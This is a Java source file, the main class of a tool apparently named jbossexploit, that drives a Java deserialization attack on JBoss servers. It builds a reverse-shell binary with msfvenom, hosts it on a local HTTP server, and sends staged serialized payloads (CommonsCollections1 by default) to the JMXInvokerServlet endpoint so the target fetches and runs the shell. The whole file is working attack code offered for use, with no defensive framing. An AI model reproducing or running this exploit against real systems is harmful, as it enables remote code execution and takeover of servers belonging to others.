public class Main {
	public static void main(java.lang.String[] args) {
		java.lang.String binaryName = jbossexploit.Msfvenom.generateBinaryName();
		org.apache.commons.cli.CommandLine cmd = jbossexploit.Cli.parseArguments(args);
		java.lang.String rhost = cmd.getOptionValue("rhost");
		int rport = java.lang.Integer.parseInt(cmd.getOptionValue("rport"));
		java.lang.String lhost = cmd.getOptionValue("lhost");
		int lport = java.lang.Integer.parseInt(cmd.getOptionValue("lport"));
		int srvport = java.lang.Integer.parseInt(cmd.getOptionValue("srvport"));
		java.lang.String uripath = cmd.getOptionValue("uripath");
		if (uripath == null) {
			uripath = "/invoker/JMXInvokerServlet";
		}
		java.lang.String payloadname = cmd.getOptionValue("payload");
		if (payloadname == null) {
			payloadname = "CommonsCollections1";
		}
		java.lang.System.out.println(("Generating reverse shell binary with msfvenom at /tmp/" + binaryName) + "...");
		jbossexploit.Msfvenom.generateBinary(lhost, lport, binaryName);
		java.lang.System.out.println("Starting HTTP Server...");
		jbossexploit.Main.hostFile(srvport);
		java.lang.System.out.println("Sending serialized commands...");
		int stage;
		for (stage = 0; stage < 3; stage++) {
			java.lang.System.out.println("Sending stage " + stage);
			jbossexploit.Stager.sendPayload(stage, rhost, rport, lhost, srvport, binaryName, uripath, payloadname);
		}
	}

	public static void hostFile(int srvport) {
		final int port = srvport;
		final jbossexploit.HttpFileServer server = new jbossexploit.HttpFileServer();
		new java.lang.Thread() {
			@java.lang.Override
			public void run() {
				try {
					server.main(port);
				} catch (java.lang.Exception e) {
					java.lang.System.out.println("Could not start HTTP Server.");
					java.lang.System.exit(1);
				}
			}
		}.start();
	}
}